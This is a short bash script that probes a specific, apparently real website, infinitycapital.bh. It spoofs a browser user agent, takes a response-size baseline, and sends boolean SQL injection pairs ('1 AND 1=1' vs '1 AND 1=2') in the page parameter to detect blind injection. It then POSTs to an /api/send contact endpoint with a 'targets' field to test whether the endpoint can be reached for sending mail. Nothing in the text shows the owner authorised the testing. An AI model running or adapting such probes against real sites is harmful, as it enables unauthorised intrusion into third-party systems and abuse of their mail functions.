#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
echo "=== A) identical URL x5 (noise baseline) ==="
for i in 1 2 3 4 5; do
  curl -sk -o /tmp/n.body -w "rep$i http=%{http_code} size=%{size_download} " -A "$UA" "$B/?page=1"
  echo "md5=$(md5sum /tmp/n.body|cut -c1-16)"
  sleep 1
done
echo "=== B) boolean pairs, urlencoded ==="
for v in "1" "1%20AND%201%3D1" "1%20AND%201%3D2"; do
  for i in 1 2; do
    curl -sk -o /tmp/b.body -w "v=$v rep$i http=%{http_code} size=%{size_download} " -A "$UA" "$B/?page=$v"
    echo "md5=$(md5sum /tmp/b.body|cut -c1-16)"
    sleep 1
  done
done
echo "=== C) POST /api/send reachability (no mail sent: invalid target) ==="
curl -sk -o /tmp/s.body -w "send http=%{http_code} size=%{size_download}\n" -A "$UA" -X POST "$B/api/send" \
  -F "fname=T" -F "lname=U" -F "areacode=0" -F "tel=1" -F "cname=p" -F "subject=s" -F "msg=reachability probe" -F "check=yes" \
  --form-string "targets=invalid@@example.invalid"
head -c 400 /tmp/s.body; echo
